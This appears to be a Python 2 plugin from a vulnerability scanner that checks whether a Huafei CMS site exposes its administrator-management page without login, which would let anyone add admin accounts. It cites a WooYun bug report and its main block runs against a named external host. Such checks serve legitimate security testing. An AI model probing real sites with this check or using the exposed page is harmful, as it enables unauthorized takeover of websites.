#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:华飞科技建站系统禁用js可以访问后台可以添加管理
#Refer:http://www.wooyun.org/bugs/wooyun-2010-083888

from ..miniCurl import Curl
from ..t  import T

class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        url=arg+"admin/User/manageadmin.aspx"
        code,head,res,errcode,_=curl.curl2(url)
        if code==200 and 'addadmin.aspx' in res:
            output(url,result,'hole')
    

        del curl
        return result


def output(url,result,label):
    info = url + '  huaficms  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='huaficms Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/huaficms/huaficms_c8eb9652690ea8366b0f4852d5aeaead.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__=="__main__":
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/huaficms/huaficms_c8eb9652690ea8366b0f4852d5aeaead.py
#/root/github/poccreate/codesrc/exp-2647.py